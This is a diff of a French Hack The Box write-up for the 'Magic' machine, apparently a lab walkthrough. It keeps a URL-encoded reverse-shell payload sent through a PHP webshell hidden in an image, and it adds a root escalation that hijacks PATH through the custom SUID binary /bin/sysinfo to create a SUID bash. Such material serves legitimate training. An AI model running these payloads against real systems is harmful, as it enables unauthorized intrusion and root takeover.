@@ -715,16 +715,27 @@ Comme cette commande doit être envoyée dans une URL, certains caractères spé
 http://magic.htb/images/uploads/debian-logo.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.20/4444%200%3E%261%27
 ```
 
-Une fois l’URL appelée, une connexion arrive sur le listener `nc` ouvert sur Kali.
+Sur Kali, tu commences par ouvrir un port en écoute. 
+
+Tu pourrais utiliser simplement `nc` :
 
 ```bash
 nc -lvnp 4444
+```
 
-listening on [any] 4444 ...
-connect to [10.10.16.20] from (UNKNOWN) [10.129.34.106] 38608
-bash: cannot set terminal process group (1158): Inappropriate ioctl for device
+Pour plus de confort, tu peux aussi utiliser `rlwrap` au lieu de `nc` :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+Une fois l’URL appelée, une connexion arrive sur le listener ouvert sur Kali.
+
+```bash
+Listening on 0.0.0.0 4444
+Connection received on 10.129.x.x 37936
+bash: cannot set terminal process group (1119): Inappropriate ioctl for device
 bash: no job control in this shell
-www-data@magic:/var/www/Magic/images/uploads$ 
 ```
 
 Tu obtiens alors un shell distant sur la machine cible.
@@ -742,16 +753,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 À ce stade, tu as quitté le simple webshell dans l’URL. Tu disposes maintenant d’un reverse shell en tant que `www-data`, ce qui va rendre l’énumération locale beaucoup plus confortable.
-
-La chaîne devient donc :
-
-```text
-Injection SQL
-→ accès à la zone d’upload
-→ image PNG contenant du PHP
-→ webshell
-→ reverse shell www-data
-```
 
 ### Stabilisation du shell
 
@@ -1120,159 +1121,228 @@ La suite consiste maintenant à chercher un moyen d’élever les privilèges po
 
 {{< escalade-intro user="thesus" >}}
 
-### Observation passive avec pspy64
+### Vérification des droits sudo
 
-```bash
-./pspy64
-```
-
-Si système 32 bits :
-
-```bash
-./pspy32
-```
-
-### Vérification sudo
+La première vérification consiste à rechercher d’éventuels droits `sudo` accordés à l’utilisateur courant :
 
 ```bash
 sudo -l
 ```
 
-### Exploration du contexte utilisateur
+La réponse est :
 
-```bash
-whoami
-id
-pwd
-uname -a
-hostname
-find /home /opt -type f -readable 2>/dev/null
+```txt
+Sorry, user theseus may not run sudo on magic.
 ```
 
-### Capabilities
+Aucun droit `sudo` exploitable n’est disponible pour `theseus`. Il faut donc poursuivre l’énumération locale avec d’autres mécanismes susceptibles de permettre une escalade de privilèges.
 
-```bash
+### Recherche de capabilities exploitables
+
+Les capabilities Linux permettent d’accorder certains privilèges particuliers à un programme sans lui attribuer l’ensemble des droits de `root`.
+
+La commande suivante recherche les capabilities présentes sur le système :
+
+```
 getcap -r / 2>/dev/null
 ```
 
-### SUID
+La sortie obtenue est la suivante :
+
+```
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/snap/core20/1026/usr/bin/ping = cap_net_raw+ep
+```
+
+Les capabilities découvertes concernent principalement des opérations réseau ou des composants système attendus. Elles ne fournissent pas de piste évidente permettant d’obtenir les privilèges de `root`.
+
+### Recherche des binaires SUID
+
+Pour poursuivre l’énumération locale, le script `suid3num.py` est téléchargé dans `/dev/shm` en suivant la recette dédiée à l’escalade de privilèges sous Linux : 
+
+{{< recette "privilege-escalation-linux" >}}
+
+
+
+Le script est ensuite exécuté afin de rechercher les fichiers disposant du bit SUID :
 
 ```bash
-python3 suid3num.py
+python3 /dev/shm/suid3num.py
 ```
 
-Alternative :
+Lorsqu’un programme SUID est exécuté, il utilise l’identité effective de son propriétaire plutôt que celle de l’utilisateur qui le lance. Un binaire SUID appartenant à `root` peut donc devenir intéressant s’il contient une faiblesse exploitable.
+
+L’outil signale notamment un binaire personnalisé :
+
+```txt
+[~] Custom SUID Binaries (Interesting Stuff)
+------------------------------
+/bin/sysinfo
+------------------------------
+```
+
+Les permissions et les caractéristiques de ce fichier sont ensuite vérifiées manuellement :
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-### Services locaux
-
-```bash
-ss -tulnp
-```
-
-Alternative :
-
-```bash
-netstat -tulnp
-```
-
-### Recherche d’un service derrière un port local
-
-Exemple avec le port `8080` :
-
-```bash
-grep -r ':8080' /etc 2>/dev/null
-```
-
-Recherche élargie :
-
-```bash
-grep -r '8080' /etc 2>/dev/null
-```
-
-### Tunnel SSH vers un service local
-
-Exemple avec un service local sur `127.0.0.1:8080` :
-
-```bash
-ssh -L 8080:127.0.0.1:8080 user@target
-```
-
-Accès depuis Kali :
-
-```text
-http://localhost:8080
-```
-
-### Linpeas
-
-```bash
-./linpeas.sh
-```
-
-### Dernier recours : le kernel
-
-```bash
-uname -a
-./les.sh
-```
-
-### Conclusion de l’énumération privilege escalation
-
-À la fin de cette phase, tu peux résumer les pistes testées :
-
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
-
-Dans ce cas précis, la piste exploitable est :
-
-```text
-<résumer ici la piste réellement exploitée>
-```
-
-### Exploitation de la piste identifiée
-
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
-
-```bash
-<commandes d’exploitation>
-```
-
-Tu confirmes l’élévation de privilèges :
-
-```bash
-whoami
+ls -la /bin/sysinfo
+file /bin/sysinfo
 id
-hostname
 ```
 
-Résultat attendu :
-
-```text
-root
-uid=0(root) gid=0(root) groups=0(root)
-machine
-```
-
-### root.txt
-
-Une fois root, tu peux lire le flag final :
+La sortie confirme que `/bin/sysinfo` appartient à `root`, possède le bit SUID et peut être exécuté par les membres du groupe `users` :
 
 ```bash
-cat /root/root.txt
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
 ```
 
-Cette étape termine l’escalade de privilèges.
+L’utilisateur `theseus` appartient justement à ce groupe :
+
+```
+uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
+```
+
+Il est donc autorisé à exécuter `/bin/sysinfo`. Grâce au bit SUID, le programme utilise alors les privilèges effectifs de son propriétaire, c’est-à-dire `root`.
+
+### Analyse du fonctionnement de `/bin/sysinfo`
+
+Le simple fait qu’un programme soit SUID ne suffit pas nécessairement à l’exploiter. Il faut d’abord comprendre son fonctionnement et identifier les commandes externes qu’il exécute.
+
+L’outil `strace` permet d’observer les appels à `execve` réalisés par le programme et ses processus enfants :
+
+```bash
+strace -f -e execve /bin/sysinfo 2>&1
+```
+
+La sortie montre que `/bin/sysinfo` lance plusieurs commandes par l’intermédiaire de `/bin/sh -c` :
+
+```bash
+execve("/bin/sh", ["sh", "-c", "lshw -short"], ...)
+execve("/bin/sh", ["sh", "-c", "fdisk -l"], ...)
+execve("/bin/sh", ["sh", "-c", "cat /proc/cpuinfo"], ...)
+execve("/bin/sh", ["sh", "-c", "free -h"], ...)
+```
+
+Le programme exécute donc notamment la commande suivante :
+
+```bash
+lshw -short
+```
+
+Le chemin absolu du programme `lshw` n’est pas précisé. Une implémentation plus sûre aurait utilisé :
+
+```bash
+/usr/bin/lshw -short
+```
+
+En l’absence de chemin absolu, le shell recherche le programme `lshw` dans les différents répertoires définis par la variable d’environnement `PATH`, en respectant leur ordre.
+
+Il devient alors possible de placer un faux programme nommé `lshw` dans un répertoire contrôlé par `theseus`, puis de placer ce répertoire au début du `PATH`.
+
+Cette faiblesse permet un détournement du `PATH`.
+
+### Confirmation de l’exécution avec les privilèges de root
+
+Avant de procéder à l’exploitation finale, une preuve de concept permet de vérifier que le faux programme sera bien exécuté avec les privilèges effectifs de `root`.
+
+Le répertoire `/dev/shm` est utilisé, car `theseus` peut y créer et exécuter des fichiers.
+
+Un faux programme `lshw` est créé :
+
+```bash
+cat > /dev/shm/lshw << 'EOF'
+#!/bin/bash
+id > /dev/shm/sysinfo_poc.txt
+whoami >> /dev/shm/sysinfo_poc.txt
+EOF
+```
+
+Le script doit ensuite être rendu exécutable :
+
+```bash
+chmod +x /dev/shm/lshw
+```
+
+Le répertoire `/dev/shm` est placé temporairement au début du `PATH` avant de lancer `/bin/sysinfo` :
+
+```bash
+PATH=/dev/shm:$PATH /bin/sysinfo
+```
+
+Lorsque `/bin/sysinfo` tente d’exécuter `lshw`, le shell trouve d’abord `/dev/shm/lshw` et l’exécute à la place du programme légitime.
+
+Le résultat de la preuve de concept est consulté :
+
+```bash
+cat /dev/shm/sysinfo_poc.txt
+```
+
+Le fichier confirme que le faux programme a été exécuté avec les privilèges de `root` :
+
+```bash
+uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
+root
+```
+
+Le détournement du `PATH` est donc exploitable.
+
+### Création d’un Bash SUID
+
+La preuve de concept peut maintenant être remplacée par une charge utile permettant d’obtenir durablement un shell privilégié.
+
+Le faux programme `lshw` est ensuite modifié afin de créer une copie SUID de Bash dans `/var/tmp` :
+
+```bash
+cat > /dev/shm/lshw << 'EOF'
+#!/bin/bash
+cp /bin/bash /var/tmp/bashroot
+chown root:root /var/tmp/bashroot
+chmod 4755 /var/tmp/bashroot
+EOF
+```
+
+Le script est rendu exécutable, puis `/bin/sysinfo` est relancé avec `/dev/shm` placé en tête du `PATH` :
+
+```bash
+chmod +x /dev/shm/lshw
+PATH=/dev/shm:$PATH /bin/sysinfo
+```
+
+Le fichier créé peut être vérifié avec :
+
+```bash
+ls -l /var/tmp/bashroot
+```
+
+La sortie confirme que la copie appartient à `root` et possède le bit SUID :
+
+```text
+-rwsr-xr-x 1 root root 1113504 Jul 10 01:40 /var/tmp/bashroot
+```
+
+Le Bash SUID est ensuite lancé avec l’option `-p` :
+
+```bash
+/var/tmp/bashroot -p
+```
+
+Cette option demande à Bash de conserver ses privilèges effectifs. La commande `id` confirme alors que l’UID réel reste celui de `theseus`, tandis que l’UID effectif devient celui de `root` :
+
+```text
+uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
+```
+
+Le shell dispose donc des privilèges nécessaires pour accéder au répertoire `/root` et lire le fichier `root.txt`.
+
+### Lecture de root.txt
+
+```bash
+bashroot-4.4# cat /root/root.txt
+3ff3xxxxxxxxxxxxxxxxxxxxxxxxxxxxd8d4
+```
+
+
 
 ## Conclusion
 
